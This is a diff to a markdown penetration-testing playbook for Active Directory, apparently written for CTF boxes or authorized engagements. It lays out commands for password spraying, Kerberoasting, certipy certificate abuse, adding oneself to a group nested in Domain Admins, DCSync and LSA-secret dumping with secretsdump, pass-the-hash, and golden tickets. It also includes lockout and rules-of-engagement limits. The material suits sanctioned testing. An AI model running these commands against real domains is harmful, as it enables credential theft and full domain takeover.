@@ -58,6 +58,7 @@ Footholds: null/guest SMB, anonymous LDAP bind, AS-REP-roastable users (no preau
 
 ## Spray-safe + AD safety gate (READ FIRST)
 - **Spray-safe lockout gate - the AD analog of the `hunt-core` enumeration limits.** Read the domain lockout policy BEFORE any spray: `nxc smb <dc> -u <user> -p <pass> --pass-pol`. Spray at most **1 attempt per account per observation window**, and never exceed `(lockoutThreshold - 1)` attempts per account per window. RoE `no_bruteforce` / `passive_only` -> enumerate only, NO spray. Locking real accounts is a client-impacting incident, not a finding.
+- **Also read SYSVOL's Default Domain Policy `GptTmpl.inf`** alongside `--pass-pol`: `LockoutBadCount = 0` = lockout disabled domain-wide (changes spray calculus), and stock files close the GPP `cpassword` check in one read ([[ad-enumeration]]).
 - **Reuse captured creds first** (from `loot.md`) before researching new ones; default/known creds before any spray (see [[default-credentials]]).
 - **Clock skew:** sync to DC (`ntpdate <dc>` or `faketime`) or Kerberos TGT requests fail with `KRB_AP_ERR_SKEW`.
 - **Stale `/etc/hosts` realm entry silently breaks Kerberos.** A prior box's `<realm> -> <old-ip>` line makes impacket resolve the KDC to a dead host and hang with `[Errno 110] Connection timed out (REALM:88)`, even though certipy (which forces `-dc-ip`) worked seconds earlier. When you add the DC to `/etc/hosts`, REMOVE any existing line for the same realm, and ALWAYS pass `-dc-ip <dc>` (and `-target-ip <dc>`) on impacket Kerberos ops so KDC/target resolution never depends on DNS/hosts. Same fix if `certipy req` throws `The NETBIOS connection ... timed out`: add `-target-ip <dc>`.
@@ -65,7 +66,7 @@ Footholds: null/guest SMB, anonymous LDAP bind, AS-REP-roastable users (no preau
 - Never pivot through `192.168.1.x` hosts (Ligolo tunnel only for lateral movement).
 
 ## Ranked path + highest-value edges
-Ranked: enum -> AS-REP/Kerberoast -> ACL / ADCS ESC1-16 -> delegation -> DCSync -> lateral -> DA. **The ADCS ESC1-16 matrix (step 5) and the delegation paths (step 6) are the highest-value edges** - one vulnerable template or a writable `msDS-AllowedToActOnBehalfOfOtherIdentity` is often the entire DA chain. **Chain:** every cracked/sprayed cred re-feeds enum + BloodHound; a Kerberoastable SPN account doubles as an RBCD `-delegate-from`; an on-box cred store (step 7) frequently yields the account that holds the winning ACL.
+Ranked: enum -> AS-REP/Kerberoast -> ACL / ADCS ESC1-16 -> delegation -> DCSync -> lateral -> DA. **The ADCS ESC1-16 matrix (step 5) and the delegation paths (step 6) are the highest-value edges** - one vulnerable template or a writable `msDS-AllowedToActOnBehalfOfOtherIdentity` is often the entire DA chain. **Chain:** every cracked/sprayed cred re-feeds enum + BloodHound; a Kerberoastable SPN account doubles as an RBCD `-delegate-from`; an on-box cred store (step 7) frequently yields the account that holds the winning ACL. A Windows foothold is an AD vantage only if it is domain-joined: confirm with `nltest /dsgetdc:` / `systeminfo` before investing in pivots from it (a WORKGROUP standalone has zero AD pivot value, and `/dsgetdc` doubles as that host's cheapest DC-reachability test) - [[ad-enumeration]].
 
 ## Methodology
 
@@ -123,9 +124,17 @@ hashcat -m 18200 asrep.txt rockyou.txt;  hashcat -m 13100 tgs.txt rockyou.txt
      crack returns nothing.
 4. **BloodHound + ACL abuse:**
 ```bash
-nxc ldap <dc> -u <user> -p <pass> --bloodhound -c all --dns-server <dc>
+nxc ldap <dc> -u <user> -p <pass> --bloodhound -c all --dns-server <dc> --dns-tcp
 # GenericWrite/WriteDACL/GenericAll -> shadow creds (certipy shadow auto), targeted Kerberoast, group add
 ```
+   - **Through a SOCKS pivot** the collection needs `--dns-tcp` too (UDP DNS never traverses the
+     tunnel, DC discovery dies with "Could not find a domain controller"), and certipy needs
+     `-ldap-scheme ldap`; [[pivoting]] carries the toolkit gotchas. No GUI needed: jq over the zip's
+     users/groups JSON lists exactly what a principal holds rights on ([[bloodhound]]).
+   - **GenericWrite on a GROUP is a self-add**: the group may be NESTED in Domain Admins (you never
+     touch DA directly); when RPC will not traverse the pivot, add yourself with a raw ldap3
+     `MODIFY_ADD` on `member` and REVERT right after the DCSync dump. Empty roast/ADCS/delegation
+     surface + explicit ACEs on Tier-0 objects = exactly this pattern ([[active-directory-access-controls-aclace]]).
    - **A ForceChangePassword/control chain that "dead-ends" is a BloodHound-ACL blind spot, NOT a
      dead end. Re-enumerate the ATTRIBUTES of every account you gain, especially the terminal one.**
      The winning primitive is frequently an account PROPERTY the ACL graph does not surface as an
@@ -151,8 +160,16 @@ certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <vuln> -upn administ
 nxc smb <dc> -u <user> -p <pass> --ntds                 # if admin
 impacket-secretsdump <domain>/<user>:<pass>@<dc>        # DCSync if rights
 ```
+   - **`AutoAdminLogon=1` with no registry `DefaultPassword` is NOT a dead end:** provisioning scripts
+     store the password via `LsaStorePrivateData`, so it lives in the LSA secret instead;
+     `impacket-secretsdump` on the host prints it under `DefaultPassword`, and it can be a full DOMAIN
+     credential, valuable far beyond the host ([[windows-privilege-escalation]]).
    - **On-box cred stores (via RDP/session):** a user only in **Remote Desktop Users** can still RDP the DC (nxc rdp shows Pwn3d) -> hunt KeePass `*.kdbx`, browser/WinSCP/RDP creds. A KeePass DB keyed to the **Windows user account** (`KeePass.config.xml` `<UserAccount>true</UserAccount>`) is UNCRACKABLE offline - open KeePass ON the box as that user, then spray the creds for reuse. Headless-RDP recipe: [[ad-lateral-movement]] / Skill(ctf-box); see [[password-cracking]].
 8. **Lateral:** PtH / PtT / overpass-the-hash -> `evil-winrm`, `nxc ... -x`, `impacket-wmiexec`, `psexec`. **AV gotcha:** Defender blocks `nxc -x`/wmiexec output retrieval ("could not retrieve output file"); to just READ a file (the flag) as admin, skip exec entirely: `smbclient //<dc>/C$ -U <dom>/Administrator --pw-nt-hash <nt> -c 'get Users\Administrator\Desktop\flag.txt'`, or use `--exec-method smbexec/atexec`.
+   - **A valid local admin refused by WinRM but accepted by SMB** = session-configuration SDDL
+     granting built-in Administrators only (hits dedicated service-admin accounts even with
+     `LocalAccountTokenFilterPolicy=1`): do not grind WinRM variants, route the admin work over SMB
+     (`impacket-secretsdump`, `smbclient //host/C$`) - [[windows-using-credentials]].
 9. **Dominance:** golden (krbtgt) / silver / diamond ticket, DCSync persistence, AdminSDHolder, certificate (ESC8 NTLM relay to ADCS web enroll).
 10. **Distill (confirmed, GENERIC):** a reusable ACL chain / ADCS ESC variant / relay primitive -> `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/active-directory/adcs.md`.
 
